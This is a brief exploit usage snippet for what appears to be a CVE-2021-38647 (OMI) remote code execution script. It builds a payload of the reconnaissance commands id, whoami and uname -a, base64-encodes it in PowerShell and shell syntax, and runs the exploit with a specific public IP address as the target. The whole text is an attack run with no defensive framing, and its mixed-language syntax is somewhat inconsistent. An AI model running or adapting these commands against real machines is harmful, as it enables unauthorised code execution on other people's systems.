# Python script
# Execute script on the target machine.
$MyScript = @"
id
whoami
uname -a
"@
$enc = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($MyScript)) #  For Windows

echo 'id' | base64 # For Linux

#python CVE-2021-38647.py -t 40.87.92.228 -s ZWNobyAiIg0KZWNobyAiSGVsbG8iDQplY2hvICJHb29kYnllIg==
python CVE-2021-38647.py -t 40.87.92.228 -s $MyScript

